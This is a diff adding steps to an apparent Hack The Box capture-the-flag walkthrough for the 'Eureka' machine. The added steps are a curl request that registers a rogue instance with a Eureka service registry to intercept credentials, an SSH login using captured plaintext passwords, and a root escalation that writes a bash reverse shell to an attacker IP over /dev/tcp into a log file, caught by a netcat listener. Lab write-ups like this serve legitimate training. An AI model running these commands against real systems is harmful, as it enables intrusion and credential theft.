@@ -65,9 +65,26 @@ Now , we've checked all we can do , fordward the 8761 onto your localhost host:
 
   ![Screenshot_2025-04-28_12_18_29](https://github.com/user-attachments/assets/062285f7-0b87-456c-a8a2-863c93f94f58)
 
-Till the machine is still active , i hope you're get a more fun through that , i'll complete it once retired ; be up !!!
+		curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H 'Content-Type: application/json' -d '{"instance": {"instanceId": "USER-MANAGEMENT-SERVICE","hostName": "YOURIP","app": "USER-MANAGEMENT-SERVICE","ipAddr": "YOURIP","vipAddress": "USER-MANAGEMENT-SERVICE","secureVipAddress": "USER-MANAGEMENT-SERVICE","status": "UP","port": { "$": 8081, "@enabled": "true" },"dataCenterInfo": {"@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name": "MyOwn"}}}'
 
+#replace the case marked YOURIP with your attacker ip and that's it , you should be able to get it worked
+Wait for 2 minutes to get connection in your netcat with credentials, username miranda-
+wise and password IL!veT0Be&BeT0L0ve .
+Now ssh using those credentials
+		ssh miranda-wise@10.10.11.66
+		pass : IL!veT0Be&BeT0L0ve
+		cat user.txt
+#Priviledge Escalation rooting
 
+then in  your attacker machine , setting up a netcat listenner
+	nc -nlvp 9999
+then in ssh shell of the target
+	rm -f /var/www/web/user-management-service/log/application.log;echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/<YOUR-IP>/9999 0>&1)]' >/var/www/web/user-management-service/log/application.log
+	
+ also be sure to replace YOUR-IP handler with your real one , if you wanna change the port go ahead
 
+	wait until the shell got executed , that should take around 2 minutes i mean so 
+ 		cat /root/root.txt
+   ![Screenshot 2025-05-05 at 05-11-16 Hack The Box Hack The Box](https://github.com/user-attachments/assets/0bf324c9-0f87-4ea1-9646-b0da88325ccf)
 
 #ArtemisTEAM
